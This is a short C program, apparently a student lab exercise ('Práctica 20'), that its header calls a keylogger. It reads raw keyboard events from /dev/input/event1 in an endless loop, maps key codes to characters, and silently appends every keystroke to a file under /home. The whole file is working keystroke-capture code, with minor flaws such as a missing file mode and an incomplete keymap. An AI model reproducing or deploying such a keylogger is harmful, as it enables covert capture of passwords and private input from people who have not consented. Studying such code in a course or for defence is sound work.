//Parra Arroyo Fernando Marcos
//Práctica 20
//Keylogger

#include<stdio.h>
#include<stdlib.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<linux/input.h>
#include<fcntl.h>
#include<unistd.h>
int main(int argc, char *argv[])
{
	struct input_event ev;
	int fdr,fdw,rd,dato,out;//Declaracion de un descriptor de archivos.
	char *teclas ="  1234567890'   qwertyuiop +  asdfghjklñ{} zxcvbnm,.-    "; //caracteres correspondientes a cada tecla
	char *salida="/home/salida\0"; // se declara la ruta del archivo
	char *entrada="/dev/input/event1\0"; // se declara la ruta del archivo
	
	fdw=open(salida,O_WRONLY|O_CREAT|O_APPEND);
	fdr=open(entrada,O_RDONLY); // se abre el archivo en modo de lectura 

	if(fdw==-1) fprintf(stderr,"No se pudo abrir o crear el archivo de salida");
	if(fdr==-1) fprintf(stderr,"No se pudo abrir o crear el archivo de entrada");
	//si se puede leer el archivo se imprime un entero obtenido del archivo 
	
	while(1)
	{
		rd = read(fdr,(void*)&ev,sizeof(struct input_event)); // se lee del archivo event1 estructuras de tipo input_event y se guardan en ev	

		 //si la tecla ha sido presionada y se leyó algo del archivo event1, y el valor del evento corresponde a EV_KEY, es decir ,0
		if(rd>0 && ev.value==0 && ev.type==1)
		{
				out=write(fdw,(void*)&teclas[ev.code],sizeof(char)); // se esrcibe en el archivo las teclas presionadas
		}

	}
	if(close(fdr)==-1) fprintf(stderr,"No se pudo cerrar el descriptor de archivo"); //se cierra el descriptor de archivo
	if(close(fdw)==-1) fprintf(stderr,"No se pudo cerrar el descriptor de archivo de salida"); //se cierra el descriptor de archivo
}